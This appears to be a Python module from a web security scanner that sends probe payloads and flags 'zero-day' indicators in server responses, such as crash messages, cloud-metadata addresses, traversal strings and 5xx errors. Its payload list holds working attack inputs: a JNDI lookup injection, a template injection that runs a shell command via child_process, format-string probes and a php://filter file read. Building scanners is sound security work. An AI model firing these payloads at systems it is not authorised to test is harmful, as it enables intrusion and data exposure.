"""Zero-day heuristic detection — anomalous behavior and unusual response patterns."""

from __future__ import annotations

from basilisk.models import Finding
from basilisk.scoring import score_finding


ZERO_DAY_INDICATORS = [
    {"type": "memory_corruption", "patterns": ["0x", "segmentation fault", "core dumped", "SIGSEGV", "access violation"]},
    {"type": "buffer_overflow", "patterns": ["stack smashing", "buffer overflow", "heap corruption", "abort()"]},
    {"type": "type_confusion", "patterns": ["type mismatch", "unexpected type", "type error", "invalid type"]},
    {"type": "integer_overflow", "patterns": ["integer overflow", "overflow", "-2147483648", "2147483647"]},
    {"type": "use_after_free", "patterns": ["double free", "use after free", "invalid pointer", "dangling"]},
    {"type": "format_string", "patterns": ["%x%x%x%x", "%n%n", "AAAA%x", "BBBB%x"]},
    {"type": "deserialization", "patterns": ["deserialization", "unserialize", "pickle", "yaml.load"]},
    {"type": "ssrf_cloud", "patterns": ["169.254.169.254", "metadata.google", "ec2."]},
    {"type": "path_traversal", "patterns": ["../../../etc", "....//....//", "..\\..\\..\\"]},
]

ANOMALOUS_STATUS_CODES = [500, 501, 502, 503, 504, 505]
ANOMALOUS_LOW_STATUS = [100, 102, 103]

EXPERIMENTAL_PAYLOADS = [
    "\x00\x01\x02\x03\x04\x05\x06\x07",
    "A" * 10000,
    "%n%n%n%n%n%n%n%n%n",
    "\xff\xfe\x00\x01",
    "%00%00%00%00",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "${jndi:ldap://127.0.0.1:1389/}",
    "{{constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}",
    "/.git/config",
    "php://filter/convert.base64-encode/resource=index",
]


def detect_anomaly(response: dict, payload: str, target: str = "") -> Finding | None:
    body = response.get("body", "")
    status = response.get("status_code", 0)
    lower_body = body.lower()

    for indicator in ZERO_DAY_INDICATORS:
        for pattern in indicator["patterns"]:
            if pattern in lower_body:
                cvss, vector = score_finding("zero_day")
                return Finding(
                    vulnerability=f"Zero-Day Indicator: {indicator['type']}",
                    severity="High",
                    description=f"Anomalous response pattern '{pattern}' suggests potential unpatched {indicator['type']} vulnerability.",
                    target=target,
                    attack_type="zero_day",
                    payload=payload[:80],
                    cvss_score=cvss,
                    cvss_vector=vector,
                    confidence=0.4,
                    remediation="Investigate the affected component for known CVEs. Consider vendor advisory for patching.",
                )

    if status in ANOMALOUS_STATUS_CODES:
        cvss, vector = score_finding("zero_day")
        return Finding(
            vulnerability="Anomalous Server Error (Zero-Day Probe)",
            severity="Medium",
            description=f"Payload triggered HTTP {status}. The abnormal error may indicate an unpatched vulnerability.",
            target=target,
            attack_type="zero_day",
            payload=payload[:80],
            cvss_score=cvss,
            cvss_vector=vector,
            confidence=0.3,
        )

    return None


def get_payloads() -> list[str]:
    return list(EXPERIMENTAL_PAYLOADS)
